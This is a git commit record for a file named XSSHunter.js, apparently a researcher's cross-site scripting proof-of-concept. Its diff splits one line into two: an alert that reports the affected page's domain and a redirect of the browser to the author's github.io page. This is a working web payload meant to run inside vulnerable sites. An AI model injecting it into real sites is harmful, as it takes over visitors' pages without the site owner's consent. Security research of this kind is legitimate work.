dc7034b066bbd4ecb7866c32fb9adec2a12647e6
Spaghetti ohne Wasser <105888772+spaghetti-ohne-wasser@users.noreply.github.com>
2023-03-10 10:14:01 -0800

    Update XSSHunter.js

--- XSSHunter.js
+++ XSSHunter.js
@@ -1,1 +1,2 @@
-alert("XSS by @Spaghetti-ohne-Wasser at " + document.domain);document.location="//spaghetti-ohne-wasser.github.io";
+alert("XSS by @Spaghetti-ohne-Wasser at " + document.domain);
+document.location="//spaghetti-ohne-wasser.github.io";
